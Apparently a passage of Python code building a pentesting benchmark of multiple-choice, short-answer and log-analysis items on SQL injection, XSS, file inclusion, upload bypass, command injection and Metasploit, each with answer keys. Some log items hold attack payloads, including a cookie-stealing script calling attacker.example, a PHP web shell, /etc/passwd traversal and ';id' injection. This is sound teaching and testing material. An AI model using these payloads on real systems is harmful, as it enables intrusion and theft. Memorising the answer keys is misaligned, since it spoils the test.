    "$ searchsploit vsftpd 2.3.4\n------------------------------------------------------------- ---------------------------------\n Exploit Title                                               |  Path\n------------------------------------------------------------- ---------------------------------\nvsftpd 2.3.4 - Backdoor Command Execution                    | unix/remote/17491.rb\nvsftpd 2.3.4 - Backdoor Command Execution (Metasploit)       | unix/remote/17491.py",
    "What vulnerability mechanism is confirmed by the SearchSploit query output for vsftpd version 2.3.4?",
    ["An intentional backdoor introduced in upstream source archives that executes a root shell on TCP port 6200", "A buffer overflow in the FTP PORT command handling routine", "A weak default administrative password hardcoded in the package", "An SSL certificate expiration defect in FTPS"],
    0, ["The historical vsftpd 2.3.4 compromise contained a malicious backdoor triggered by a smile smiley in the username.", "The flaw was a backdoor, not a buffer overflow.", "The vulnerability does not involve default credentials.", "The vulnerability is unrelated to SSL certificates."],
    "vsftpd 2.3.4 contains a backdoor triggered by sending a username containing ':)' which opens a root shell on port 6200.")

add_mcq("kb-pentest-041", "M05", "pentest-r1-m05-manual-verification-false-positives-01", "P32", "pentest_manual_verification", 2,
    "Why do automated vulnerability scanners frequently report false positives when auditing Apache or OpenSSH versions on Debian and Ubuntu servers?",
    ["Linux distributions routinely backport security patches into older upstream versions without incrementing upstream version numbers", "The scanners cannot establish TCP connections to Debian hosts", "Debian Linux does not publish CVE security advisories", "Linux operating systems deliberately send randomized fake version banners"],
    0, ["Debian/Ubuntu package maintainers apply security fixes to existing stable releases (backporting), keeping version numbers unchanged.", "TCP connectivity succeeds normally.", "Debian publishes detailed security tracker advisories for all CVEs.", "Banners are static and standard, not randomized."],
    "Distribution backporting fixes CVEs while retaining base version strings (e.g. OpenSSH 8.9p1-3ubuntu0.1), confusing banner-matching automated scanners.")

add_mcq("kb-pentest-042", "M05", "pentest-r1-m05-manual-verification-false-positives-01", "P33", "pentest_manual_verification", 1,
    "During manual vulnerability verification in an authorized test, what is the core requirement when executing a Proof of Concept (PoC)?",
    ["Demonstrating vulnerability existence non-destructively without altering data or causing operational downtime", "Crashing the operating system to prove code execution depth", "Deploying permanent rootkits to maintain testing access for future years", "Formatting the primary database drive to verify data recovery plans"],
    0, ["Professional verification uses non-destructive proofs (e.g. running 'id' or 'whoami') without disrupting service.", "Crashing systems violates RoE availability agreements.", "Installing unapproved persistent rootkits violates professional codes of conduct.", "Formatting drives is destructive and unauthorized."],
    "PoC verification must demonstrate vulnerability trigger conditions safely without causing denial of service or permanent data corruption.")

add_short("kb-pentest-043", "M05", "pentest-r1-m05-vuln-scanning-cve-search-01", "P71", "pentest_vuln_assessment", 1,
    "Which SearchSploit command-line flag copies an exploit script from the local database mirror into the current working directory?",
    ["-m", "searchsploit -m"],
    "The '-m' (mirror) flag in SearchSploit copies the requested exploit script to the current working directory for editing.")

add_mcq("kb-pentest-044", "M05", "pentest-r1-m05-vuln-scanning-cve-search-01", "P92", "pentest_findings_documentation", 2,
    "In CVSS v3.1 metric evaluation, when does the Scope metric transition from Unchanged (S:U) to Changed (S:C)?",
    ["When a vulnerability in one software component impacts resources beyond its authorization boundary", "When an attacker changes the root password on the compromised host", "When the tester changes their source IP address", "When the engagement scope is expanded by the client"],
    0, ["Scope Changed (S:C) applies when the compromised authority affects other security domains (e.g. VM escape or cross-site scripting).", "Changing passwords is an action within the target context, not an authorization boundary expansion.", "Tester source IPs have no relationship to CVSS metrics.", "Engagement scope expansion is a contractual change, not a CVSS technical metric."],
    "CVSS Scope is 'Changed' (S:C) when the vulnerable component impacts resources governed by a separate security authorization authority.")

add_multi("kb-pentest-045", "M05", "pentest-r1-m05-vuln-scanning-cve-search-01", "P30", "pentest_findings_documentation", 2,
    "Which of the following metrics constitute the CVSS v3.1 Exploitability metric group? (Select all that apply)",
    ["Attack Vector (AV)", "Attack Complexity (AC)", "Privileges Required (PR)", "User Interaction (UI)"],
    [0, 1, 2, 3], ["Attack Vector measures how remotely the flaw can be reached.", "Attack Complexity measures conditions beyond the attacker's control.", "Privileges Required measures the level of access required beforehand.", "User Interaction measures whether a human victim must participate."],
    "CVSS v3.1 Base Exploitability consists of four metrics: Attack Vector (AV), Attack Complexity (AC), Privileges Required (PR), and User Interaction (UI).")

# --- M06: Web Application Pentesting (24 items) ---
add_mcq("kb-pentest-046", "M06", "pentest-r1-m06-sqli-auth-bypass-union-01", "P34", "pentest_web_sqli", 1,
    "What is the primary root cause of SQL injection vulnerabilities in web applications?",
    ["Concatenating untrusted user input directly into dynamic database query strings without parameterized queries or prepared statements", "Using an insecure TLS cipher suite on the HTTPS web server", "Storing database server passwords in a plain text configuration file", "Running database server instances with multi-threading enabled"],
    0, ["Unsanitized user input concatenated directly into SQL statements allows attackers to manipulate query logic.", "TLS cipher suites protect transport encryption, not server-side database query construction.", "Hardcoded credentials lead to credential exposure, not SQL query injection.", "Multi-threading is standard database concurrency architecture and unrelated to injection flaws."],
    "SQL injection (CWE-89) occurs when untrusted input is interpolated directly into SQL syntax without parametrization, altering the database engine's intended command execution.")

add_mcq("kb-pentest-047", "M06", "pentest-r1-m06-sqli-auth-bypass-union-01", "P35", "pentest_web_sqli", 1,
    "In an authentication bypass SQL injection attack on a login form, how does injecting `' OR '1'='1` force a successful login?",
    ["It alters the boolean logic of the SQL WHERE clause to evaluate to true for all rows", "It decrypts the administrator password stored in the database", "It creates a new administrative user account in the users table", "It causes a database connection timeout that defaults to granting access"],
    0, ["The injected boolean expression evaluates to TRUE for the first record returned by the database table.", "SQL injection payloads alter query syntax; they do not decrypt one-way password hashes.", "A SELECT query cannot insert new user records into a database.", "Database connection timeouts result in HTTP 500 errors or connection failure notices."],
    "Injecting `' OR '1'='1` forces the authentication query's WHERE clause (e.g. `WHERE username='' OR '1'='1'`) to evaluate to true, returning the first account in the table (typically the administrator).")

add_mcq("kb-pentest-048", "M06", "pentest-r1-m06-sqli-auth-bypass-union-01", "P36", "pentest_web_sqli", 2,
    "What structural requirement must be satisfied for a UNION-based SQL injection payload to execute successfully?",
    ["The injected SELECT statement must return the exact same number of columns and compatible data types as the original query", "The injected query must target a table with the exact same name as the target application database", "The database user must have administrative SUPERUSER or DBA privileges", "The query must include an encrypted SSL client certificate"],
    0, ["SQL UNION operators require both queries to have identical column counts and compatible column data types.", "UNION queries can extract data from any readable table, regardless of table name similarities.", "UNION queries execute under the existing database connection privileges and do not require administrative DBA rights.", "Client SSL certificates are transport-layer controls and have no effect on UNION query syntax."],
    "A SQL UNION operator merges result sets; the SQL standard mandates that the injected SELECT statement must produce the exact number of columns with compatible data types as the original application query.")

add_log("kb-pentest-049", "M06", "pentest-r1-m06-sqli-auth-bypass-union-01", "P36", "pentest_web_sqli", 2,
    "HTTP/1.1 500 Internal Server Error\nContent-Type: text/html\n\n<b>Database Error:</b> The used SELECT statements have a different number of columns\nQuery: SELECT id, title, content FROM articles WHERE id = 1 UNION SELECT 1, 2",
    "Analyzing the database error message above, why did the UNION SQL injection attempt fail?",
    ["The original query returns three columns, but the injected UNION SELECT statement only supplies two columns", "The target database does not support the SQL UNION operator", "The database requires user authentication before executing SELECT queries", "The injection payload was blocked by an active web application firewall"],
    0, ["The original query requests three fields (id, title, content), whereas the payload only supplied two literals (1, 2).", "All relational SQL databases (MySQL, PostgreSQL, MSSQL, SQLite) natively support the UNION operator.", "The query was already executed server-side, proving database connectivity exists.", "The database generated a syntax/column mismatch error, proving the request reached the database rather than being blocked by a WAF."],
    "The database returned a column count mismatch because the target query selected 3 columns ('id, title, content') while the injected UNION statement only provided 2 ('1, 2'). The tester must supply 3 columns (e.g., 'UNION SELECT 1, 2, 3').")

add_short("kb-pentest-050", "M06", "pentest-r1-m06-sqli-auth-bypass-union-01", "P35", "pentest_web_sqli", 2,
    "Which standard two-character SQL comment symbol is used in ANSI SQL and SQLite to truncate the remainder of an injected database query?",
    ["--", "-- -", "/*"],
    "In ANSI SQL and SQLite, the double hyphen '--' signifies an inline comment, truncating any remaining application query syntax. In MySQL, the comment sequence must be followed by a space ('-- ').")

add_mcq("kb-pentest-051", "M06", "pentest-r1-m06-sqli-auth-bypass-union-01", "P72", "pentest_web_sqli", 2,
    "How does an attacker infer database contents in a Blind Boolean-based SQL injection vulnerability?",
    ["By injecting conditional statements (true vs false) and observing differences in the application's HTTP response length or content", "By reading verbose database error messages reflected directly in the HTML response", "By forcing the database to connect back to an external SMB listener", "By cracking the database password hash using an offline GPU cluster"],
    0, ["Blind Boolean injection extracts data bit-by-bit by observing binary true/false response variations (e.g. content presence or HTTP status).", "Error-based SQLi relies on verbose error messages, which are suppressed in blind SQLi.", "Out-of-band SQLi (OOB) uses external SMB/DNS listeners, not boolean response inference.", "Offline cracking is performed after extracting hashes, not as the injection mechanism itself."],
    "Blind Boolean SQL injection systematically tests conditional propositions (e.g. 'AND SUBSTRING(password,1,1)='a''); if true, the application returns normal content, and if false, content is omitted or altered.")

add_log("kb-pentest-052", "M06", "pentest-r1-m06-sqli-auth-bypass-union-01", "P73", "pentest_web_sqli", 3,
    "$ time curl -s 'http://192.0.2.50/view.php?id=1%20AND%20(SELECT%20pg_sleep(5))'\nResponse: Article viewed.\nreal    0m5.184s\nuser    0m0.012s\nsys     0m0.008s",
    "Based on the curl timing output above, what vulnerability type and database backend are indicated?",
    ["Blind time-based SQL injection against a PostgreSQL database backend", "Reflected cross-site scripting against an Apache Tomcat server", "Local file inclusion against a Microsoft IIS web server", "Server-side request forgery against an Amazon AWS metadata endpoint"],
    0, ["The 5-second delay matching 'pg_sleep(5)' confirms blind time-based SQLi against PostgreSQL.", "XSS does not induce server-side SQL sleep delays.", "LFI reads local file paths and does not interpret SQL sleep functions.", "SSRF connects to internal IP endpoints and does not execute PostgreSQL sleep syntax."],
    "The query executed 'pg_sleep(5)' and the HTTP request took 5.184 seconds to respond, confirming blind time-based SQL injection on PostgreSQL.")

add_mcq("kb-pentest-053", "M06", "pentest-r1-m06-sqli-auth-bypass-union-01", "P65", "pentest_web_sqli", 1,
    "What is the industry-standard primary defensive control to completely eliminate SQL injection vulnerabilities in software development?",
    ["Using parameterized queries (prepared statements) with bound variables across all database queries", "Blacklisting specific characters such as single quotes and semicolons in user input", "Deploying a client-side JavaScript regex input validator", "Changing the default database administration port from 3306 to 8080"],
    0, ["Parameterized queries ensure the database treats input strictly as data parameters rather than executable SQL instructions.", "Input blacklists are easily bypassed through character encoding or alternate syntax.", "Client-side validation can be completely bypassed by intercepting HTTP requests in a proxy.", "Changing default listening ports does not alter application query logic."],
    "OWASP mandates parameterized queries (prepared statements) as the primary defense against SQL injection because they separate SQL code from user-supplied data regardless of input contents.")

add_mcq("kb-pentest-054", "M06", "pentest-r1-m06-xss-stored-reflected-01", "P37", "pentest_web_xss", 1,
    "What is the key functional difference between Reflected Cross-Site Scripting (XSS) and Stored XSS?",
    ["Reflected XSS executes immediately when malicious input in an HTTP request is echoed in the response, whereas Stored XSS persists the malicious payload in database storage", "Reflected XSS executes on the server, while Stored XSS executes in the client browser", "Reflected XSS only affects mobile browsers, while Stored XSS affects desktop browsers", "Reflected XSS requires administrative credentials, while Stored XSS requires anonymous access"],
    0, ["Reflected XSS is non-persistent and requires enticing a victim to click a specially crafted URL, while Stored XSS triggers automatically for any user viewing the persisted content.", "All forms of XSS (reflected, stored, DOM) execute client-side within the victim's browser session.", "XSS impacts any browser platform capable of executing ECMAScript/JavaScript.", "Neither reflected nor stored XSS requires administrative credentials for initial delivery."],
    "Reflected XSS is transient and delivered via URL parameters or form inputs echoed immediately, while Stored (persistent) XSS saves the script payload in a backend database, forum, or log file to infect any user viewing the page.")

add_mcq("kb-pentest-055", "M06", "pentest-r1-m06-xss-stored-reflected-01", "P38", "pentest_web_xss", 2,
    "How does DOM-based Cross-Site Scripting differ fundamentally from Reflected and Stored XSS?",
    ["The malicious script executes entirely in the client browser via client-side JavaScript processing without modifying the server's HTTP response", "It requires sending malicious shellcode directly to the server's operating system kernel", "It requires physical access to the target web server's motherboard", "It only occurs in applications written in assembly language"],
    0, ["DOM XSS occurs when client-side JavaScript reads untrusted data from a DOM source (e.g. location.hash) and passes it to an execution sink (e.g. eval or innerHTML).", "XSS is a browser-side application layer flaw, not a kernel exploit.", "Physical server access is completely unrelated to web application DOM manipulation.", "DOM XSS occurs in client-side JavaScript running in web browsers."],
    "DOM-based XSS (CWE-79) vulnerabilities exist entirely within client-side code where the server's HTTP response never contains the payload; the client's own JavaScript executes the payload from an untrusted DOM source into a DOM sink.")

add_log("kb-pentest-056", "M06", "pentest-r1-m06-xss-stored-reflected-01", "P37", "pentest_web_xss", 2,
    "<div class=\"user-profile\">\n  <h3>Welcome, User Profile</h3>\n  <p>Bio: <script>document.location='http://attacker.example/steal?c='+document.cookie;</script></p>\n</div>",
    "Review the HTML response snippet above rendered on a public forum profile page. What vulnerability and impact are demonstrated?",
    ["Stored Cross-Site Scripting (XSS) attempting session cookie exfiltration", "SQL injection attempting to drop the users table", "Local File Inclusion reading system configuration files", "Cross-Site Request Forgery changing user passwords"],
    0, ["The unescaped <script> tag in the persisted Bio field executes in visiting users' browsers to transmit session cookies to an external listener.", "The snippet contains client-side JavaScript, not SQL database statements.", "LFI reads local server files; here client-side script execution is occurring in a rendered web page.", "CSRF exploits existing ambient credentials to submit actions; here malicious JavaScript is stored and actively exfiltrating cookies."],
    "The application rendered unsanitized user-supplied input into the HTML DOM without entity encoding, enabling Stored XSS to exfiltrate 'document.cookie' to an attacker server.")

add_multi("kb-pentest-057", "M06", "pentest-r1-m06-xss-stored-reflected-01", "P38", "pentest_web_xss", 2,
    "Which of the following client-side JavaScript APIs represent dangerous execution sinks that can facilitate DOM-based XSS? (Select all that apply)",
    ["element.innerHTML", "document.write()", "window.eval()", "console.log()"],
    [0, 1, 2], ["element.innerHTML parses and renders HTML and script elements from input strings.", "document.write() injects raw HTML into the document stream, executing scripts.", "window.eval() compiles and executes arbitrary JavaScript strings.", "console.log() merely outputs diagnostic strings to the developer console and does not execute script tags."],
    "Dangerous DOM sinks that parse or execute raw strings as code or markup include innerHTML, outerHTML, document.write(), eval(), setTimeout(), and setInterval().")

add_mcq("kb-pentest-058", "M06", "pentest-r1-m06-xss-stored-reflected-01", "P66", "pentest_web_xss", 1,
    "Which combination of defensive techniques provides comprehensive protection against Cross-Site Scripting (XSS) vulnerabilities?",
    ["Context-aware output encoding, strict input sanitization, and a robust Content Security Policy (CSP)", "Disabling TCP port 443 on the perimeter firewall", "Configuring database queries with UNION operators", "Encrypting local web server hard drives with BitLocker"],
    0, ["Context-aware encoding (HTML entity, JS string, URL) neutralizes malicious scripts, while CSP restricts unauthorized script execution sources.", "Disabling HTTPS port 443 breaks web communications and does nothing to fix application code flaws.", "UNION operators are SQL syntax used in database attacks, not XSS defenses.", "Hard drive encryption protects at-rest storage from physical theft, not application layer injection."],
    "Preventing XSS requires context-aware output encoding (converting '<' to '&lt;'), the HttpOnly flag on cookies, and enforcing a restrictive Content Security Policy (CSP) header.")

add_mcq("kb-pentest-059", "M06", "pentest-r1-m06-lfi-path-traversal-auth-01", "P39", "pentest_web_lfi", 1,
    "How does an attacker utilize path traversal sequences ('../') to access sensitive files outside the intended web root?",
    ["By stepping up directory hierarchy levels to escape restricted application directories and reach root system folders", "By overflowing the web server's CPU register buffers", "By establishing an encrypted SSH tunnel over port 80", "By injecting SQL syntax into the database connection pool"],
    0, ["Each '../' sequence traverses up one parent directory in POSIX and Windows filesystems, allowing navigation from '/var/www/html' to '/etc/passwd'.", "Path traversal is a logical directory access flaw, not a binary buffer overflow.", "Traversals do not establish SSH tunnels.", "Path traversal interacts with the filesystem, not the relational database engine."],
    "Path traversal (CWE-22) uses relative path navigation sequences ('../' on Unix, '..\\' on Windows) to escape restricted web root folders and read arbitrary files across the filesystem.")

add_log("kb-pentest-060", "M06", "pentest-r1-m06-lfi-path-traversal-auth-01", "P39", "pentest_web_lfi", 2,
    "$ curl 'http://192.0.2.50/index.php?page=../../../../etc/passwd'\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\njohn:x:1000:1000:John Doe,,,:/home/john:/bin/bash",
    "Reviewing the curl command and HTTP response above, what vulnerability is confirmed and what key intelligence is disclosed?",
    ["Local File Inclusion (LFI) / Path Traversal disclosing system user accounts including 'john' with a valid login shell", "SQL injection disclosing the database administrator password hash", "Remote Code Execution executing arbitrary root bash commands", "Cross-Site Scripting reflecting an alert dialog in the browser"],
    0, ["The output displays the standard Unix /etc/passwd file, revealing user accounts, UIDs, and shells (e.g. user 'john' with /bin/bash).", "The output shows /etc/passwd, not database tables or password hashes.", "Reading a static file confirms information disclosure, not immediate arbitrary command execution.", "The output contains plain text user entries, not browser-executed JavaScript."],
    "The query exploited an unvalidated file parameter to traverse directories and read '/etc/passwd', revealing system usernames ('john') and interactive shells ('/bin/bash') for subsequent brute-forcing.")

add_mcq("kb-pentest-061", "M06", "pentest-r1-m06-lfi-path-traversal-auth-01", "P40", "pentest_web_lfi", 2,
    "Why do penetration testers utilize the PHP wrapper `php://filter/convert.base64-encode/resource=` during LFI exploitation?",
    ["It extracts the raw source code of PHP files encoded in base64 without triggering server-side PHP execution", "It automatically elevates the web server process to root privileges", "It bypasses the server's network firewall rules", "It decrypts HTTPS traffic in transit"],
    0, ["PHP filters encode the file contents into base64 before the web server engine evaluates it, allowing testers to read proprietary backend PHP source code.", "PHP wrappers operate within existing web server process privileges and do not elevate user IDs.", "Network firewall rules inspect network layer packets, not internal PHP stream wrappers.", "Stream wrappers interact with local filesystem resources, not transit encryption."],
    "Standard LFI of a PHP file causes the server to execute it rather than print its code; using the 'php://filter' base64 wrapper encodes the file stream, preventing execution and disclosing sensitive source code.")

add_short("kb-pentest-062", "M06", "pentest-r1-m06-lfi-path-traversal-auth-01", "P40", "pentest_web_lfi", 2,
    "What is the complete URI scheme and stream wrapper prefix used in PHP to apply stream filters to local resources?",
    ["php://filter", "php://filter/convert.base64-encode/resource="],
    "The 'php://filter' meta-wrapper allows applying conversion filters (such as 'convert.base64-encode') to file streams prior to inclusion or reading.")

add_multi("kb-pentest-063", "M06", "pentest-r1-m06-lfi-path-traversal-auth-01", "P74", "pentest_web_lfi", 2,
    "Which of the following techniques can bypass flawed file upload extension validation filters on web applications? (Select all that apply)",
    ["Using alternative executable extensions (e.g. .phtml, .php5, .phar)", "Spoofing the Content-Type header in the HTTP POST request (e.g. to image/jpeg)", "Appending double extensions (e.g. shell.php.jpg or shell.php;.jpg)", "Formatting the local hard drive with the ext4 filesystem"],
    [0, 1, 2], ["Web servers often execute alternative extensions like .phtml or .php5 if only .php is blacklisted.", "Applications that rely solely on client-supplied Content-Type headers can be tricked by claiming a script is an image.", "Apache misconfigurations or flawed regexes often check only the final extension, executing files named shell.php.jpg.", "Local client filesystem formatting has zero effect on remote web application upload validation logic."],
    "Flawed file upload filters can be bypassed using alternate executable extensions, double extensions, null byte terminators, and spoofing the client-controlled MIME Content-Type header.")

add_log("kb-pentest-064", "M06", "pentest-r1-m06-lfi-path-traversal-auth-01", "P74", "pentest_web_lfi", 3,
    "POST /upload.php HTTP/1.1\nHost: 192.0.2.50\nContent-Type: multipart/form-data; boundary=---------------------------123456\n\n-----------------------------123456\nContent-Disposition: form-data; name=\"avatar\"; filename=\"exploit.phtml\"\nContent-Type: image/jpeg\n\n<?php system($_GET['cmd']); ?>\n-----------------------------123456--",
    "Analyzing the raw HTTP upload request above, what specific bypass technique is being utilized by the tester?",
    ["MIME-type spoofing (Content-Type: image/jpeg) combined with an alternate executable extension (.phtml) to bypass extension and MIME filters", "SQL injection auth bypass via the filename parameter", "Cross-Site Request Forgery on the avatar upload endpoint", "Buffer overflow in the HTTP multipart boundary header"],
    0, ["The request sets the MIME type to 'image/jpeg' to satisfy MIME checks, while specifying an executable '.phtml' extension containing a PHP web shell.", "The payload contains a PHP system() execution shell, not SQL syntax.", "The request shows a direct payload delivery attempt, not a cross-site request forgery.", "Multipart boundaries are formatted properly according to RFC 7578 and do not constitute a buffer overflow."],
    "The request spoofs the client Content-Type header as 'image/jpeg' while delivering a web shell using the alternate executable extension '.phtml' to execute arbitrary commands.")

add_mcq("kb-pentest-065", "M06", "pentest-r1-m06-idor-access-control-01", "P75", "pentest_idor_access_control", 1,
    "What architectural flaw results in an Insecure Direct Object Reference (IDOR) vulnerability?",
    ["An application uses user-supplied input to access database records or files directly without validating whether the user is authorized to access that object", "The web server fails to implement SSL/TLS encryption for transit traffic", "The web application uses JSON instead of XML for API requests", "The client browser does not support ECMAScript 6"],
    0, ["IDOR occurs when an application exposes a direct reference to an internal object (e.g. account_id=105) without verifying object-level authorization.", "TLS encryption protects data in transit and has no bearing on authorization logic.", "Data exchange formats (JSON vs XML) are independent of access control enforcement.", "Client browser feature sets do not enforce server-side access control boundaries."],
    "Insecure Direct Object References (IDOR, CWE-639) occur when an application accepts user input (such as database primary keys) to access resources without server-side validation of the user's authorization rights.")

add_log("kb-pentest-066", "M06", "pentest-r1-m06-idor-access-control-01", "P75", "pentest_idor_access_control", 2,
    "Request: GET /api/v1/invoice?id=1042 HTTP/1.1\nCookie: session=user_standard_session_token\n\nResponse: HTTP/1.1 200 OK\n{\"invoice_id\": 1042, \"client\": \"Acme Corp\", \"total\": 8500.00, \"tax_id\": \"US-992144\"}",
    "If modifying the 'id' parameter to '1043' returns the confidential financial invoice of another corporation, what vulnerability has been validated?",
    ["Insecure Direct Object Reference (IDOR) / Broken Object Level Authorization (BOLA)", "Reflected Cross-Site Scripting", "SQL injection resulting in database crash", "Denial of Service via parameter tampering"],
    0, ["Accessing another customer's data simply by incrementing an object identifier demonstrates an IDOR / BOLA vulnerability.", "No scripts were executed in a client browser.", "The database responded with HTTP 200 OK without crashing or returning SQL syntax errors.", "The request successfully retrieved valid business data without causing service degradation."],
    "Tampering with an object identifier in an API to access records belonging to other tenants without authorization confirms an Insecure Direct Object Reference (IDOR / OWASP API1:2023 BOLA).")

add_mcq("kb-pentest-067", "M06", "pentest-r1-m06-sqli-auth-bypass-union-01", "P34", "pentest_web_attacks", 2,
    "In command injection vulnerabilities, which command separator characters can an attacker use on POSIX systems to chain arbitrary shell commands?",
    ["Semicolon (;), double ampersand (&&), and vertical pipe (|)", "Single quote ('), double quote (\"), and underscore (_)", "Percent sign (%), question mark (?), and asterisk (*)", "At sign (@), hash (#), and exclamation mark (!)"],
    0, ["POSIX shells treat ';', '&&', and '|' as command delimiters, executing subsequent commands sequentially or via pipes.", "Quotes and underscores are string literals and word characters, not shell execution separators.", "Wildcards and percent signs perform globbing or URL encoding, not command concatenation.", "At signs and hashes are used in variables or comments, not standard command chaining delimiters."],
    "Command injection vulnerabilities allow chaining additional shell commands using delimiters such as ';' (sequential execution), '&&' (conditional execution on success), or '|' (piped execution).")

add_log("kb-pentest-068", "M06", "pentest-r1-m06-sqli-auth-bypass-union-01", "P34", "pentest_web_attacks", 3,
    "$ curl -s 'http://192.0.2.50/network.php?host=127.0.0.1%3bid'\nPING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms\n\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
    "Review the HTTP request and response above. What vulnerability is proven by the execution of 'id' in the response?",
    ["Operating System Command Injection executing under the unprivileged 'www-data' service account", "SQL injection dumping the Linux user table", "Directory traversal reading the /etc/group file", "Denial of service ping flood against localhost"],
    0, ["The semicolon (%3b) separated the ping command and executed 'id', printing the www-data UID/GID.", "The output is generated by the operating system shell 'id' command, not a database query.", "The command executed a process; it did not traverse filesystem directories.", "A single ping packet was transmitted, which is normal network diagnostic functionality."],
    "The application passes user input directly to a system shell without sanitization, allowing an attacker to inject ';id' and execute arbitrary commands under the web server's 'www-data' account.")

add_multi("kb-pentest-069", "M06", "pentest-r1-m06-sqli-auth-bypass-union-01", "P34", "pentest_web_attacks", 3,
    "Which of the following application vulnerabilities fall under the OWASP Top 10 A03:2021 - Injection category? (Select all that apply)",
    ["SQL Injection (SQLi)", "Operating System Command Injection", "Cross-Site Scripting (XSS)", "Insecure Direct Object Reference (IDOR)"],
    [0, 1, 2], ["SQL injection is the archetypal flaw classified under OWASP A03:2021 Injection.", "OS Command Injection is classified under OWASP A03:2021 Injection.", "Cross-Site Scripting was consolidated into A03:2021 Injection in the OWASP Top 10:2021 revision.", "IDOR is classified under A01:2021 - Broken Access Control, not Injection."],
    "OWASP Top 10:2021 classified SQLi, OS Command Injection, and XSS under A03:2021-Injection, while IDOR falls under A01:2021-Broken Access Control.")

# --- M07: Vulnerability Exploitation & Metasploit (10 items) ---
add_mcq("kb-pentest-070", "M07", "pentest-r1-m07-payloads-staged-reverse-shells-01", "P41", "pentest_payload_mechanics", 1,
    "What is the fundamental difference in network connection direction between a bind shell and a reverse shell?",
    ["A bind shell opens a listening port on the target host and waits for the attacker to connect, whereas a reverse shell forces the target host to initiate an outbound connection back to the attacker's listener", "A bind shell encrypts traffic using TLS, whereas a reverse shell transmits traffic in unencrypted plain text", "A bind shell requires root privileges, whereas a reverse shell executes only in user space", "A bind shell connects over UDP, whereas a reverse shell connects exclusively over ICMP"],
    0, ["In a bind shell, the target listens; in a reverse shell, the attacker listens and the target connects outbound.", "Encryption depends on whether wrappers like OpenSSL or Meterpreter TLS are used, not connection direction.", "Both bind and reverse shells can execute under either unprivileged or root contexts depending on the exploited process.", "Both bind and reverse shells standardly operate over TCP transport."],
    "A bind shell binds a shell to a local listening port on the victim; a reverse shell forces the victim to initiate an outbound connection to the attacker's listening machine.")

add_mcq("kb-pentest-071", "M07", "pentest-r1-m07-payloads-staged-reverse-shells-01", "P42", "pentest_payload_mechanics", 1,
    "Why are reverse shells almost universally preferred over bind shells during external network penetration testing?",
    ["Perimeter firewalls and NAT devices typically block unsolicited inbound connections while permitting outbound connections over common ports (e.g. 80, 443)", "Reverse shells execute twice as fast as bind shells", "Bind shells are only supported on Windows 95 operating systems", "Reverse shells do not require specifying an IP address"],
    0, ["Firewall egress policies are frequently permissive (allowing ports 80/443 outbound), while ingress filters strictly block unsolicited inbound traffic to internal endpoints.", "Execution latency is governed by network round-trip time, not shell directionality.", "Bind shells work on all modern Unix and Windows operating systems.", "Reverse shells explicitly require the attacker's listening IP address (LHOST) and port (LPORT)."],
    "Network edge firewalls and NAT gateways block unsolicited inbound traffic, preventing attackers from connecting directly to bind shells. Reverse shells bypass ingress filtering by establishing outbound connections to the tester.")

add_mcq("kb-pentest-072", "M07", "pentest-r1-m07-payloads-staged-reverse-shells-01", "P43", "pentest_payload_mechanics", 2,
    "What is the structural difference between a staged payload and a stageless (inline) payload?",
    ["A staged payload delivers a small initial stager that connects back to retrieve the larger payload into memory, while a stageless payload contains all code in a single package", "A staged payload requires a physical USB drive, while a stageless payload operates over the internet", "A staged payload only runs on Linux, while a stageless payload runs only on Windows", "A staged payload is uncompiled source code, while a stageless payload is compiled bytecode"],
    0, ["Stagers fit into constrained buffer sizes and fetch the larger full-featured payload (stage) over the network.", "Both payload architectures are delivered across networks or files.", "Both staged and stageless payloads exist across Windows, Linux, and macOS platforms.", "Both payload variants are compiled machine code or script binaries."],
    "Staged payloads use an initial small stub (stager) to fit within tight exploit buffer limits and fetch the main payload over the network; stageless payloads bundle all functionality into one self-contained binary.")

add_log("kb-pentest-073", "M07", "pentest-r1-m07-payloads-staged-reverse-shells-01", "P77", "pentest_payload_mechanics", 2,
    "Payload A: windows/x64/meterpreter/reverse_tcp\nPayload B: windows/x64/meterpreter_reverse_tcp",
    "According to Metasploit payload naming conventions, how do Payload A and Payload B differ?",
    ["Payload A is a staged payload (indicated by the slash separator), while Payload B is a stageless/inline payload (indicated by the underscore)", "Payload A is a 32-bit payload, while Payload B is a 64-bit payload", "Payload A runs on Linux, while Payload B runs on Windows", "Payload A is an auxiliary module, while Payload B is a post-exploitation module"],
    0, ["Metasploit uses slashes ('meterpreter/reverse_tcp') for staged payloads and underscores ('meterpreter_reverse_tcp') for single/stageless payloads.", "Both payloads explicitly specify the 'x64' 64-bit architecture in their path.", "Both payloads explicitly target the 'windows' operating system.", "Both items are exploit payloads, not auxiliary or post modules."],
    "In Metasploit nomenclature, the slash between 'meterpreter' and 'reverse_tcp' denotes a staged payload requiring a multi/handler stager, whereas the underscore 'meterpreter_reverse_tcp' denotes a single, stageless inline payload.")

add_mcq("kb-pentest-074", "M07", "pentest-r1-m07-metasploit-framework-fundamentals-01", "P44", "pentest_metasploit_framework", 1,
    "In the Metasploit Framework module taxonomy, which module type is specifically designed to perform scanning, service fingerprinting, and denial of service without delivering a payload?",
    ["auxiliary", "exploit", "post", "encoder"],
    0, ["Auxiliary modules perform scanning, enumeration, fuzzing, and authentication testing without executing arbitrary payloads.", "Exploit modules deliver payloads to target systems to achieve code execution.", "Post modules execute actions on already compromised systems via existing sessions.", "Encoder modules obfuscate payload machine code to evade simple signature detection and remove bad characters."],
    "The Metasploit Framework divides modules into exploits (deliver payloads), auxiliary (scanning and information gathering without payloads), post (actions on established sessions), and encoders/payloads.")

add_mcq("kb-pentest-075", "M07", "pentest-r1-m07-metasploit-framework-fundamentals-01", "P45", "pentest_metasploit_framework", 2,
    "Which Metasploit module serves as a universal payload listener to catch reverse shells initiated by standalone exploits or external binaries?",
    ["exploit/multi/handler", "auxiliary/scanner/portscan/tcp", "post/windows/gather/credentials", "payload/generic/shell_bind_tcp"],
    0, ["'exploit/multi/handler' is the dedicated universal listener designed to receive incoming reverse shell connections from any supported payload.", "portscan/tcp is an auxiliary port scanner.", "gather/credentials is a post-exploitation credential harvesting module.", "shell_bind_tcp is a payload definition, not an active listening module."],
    "'exploit/multi/handler' is Metasploit's stub exploit used to configure and monitor incoming payload connections, handling stager negotiations and upgrading sessions to Meterpreter.")

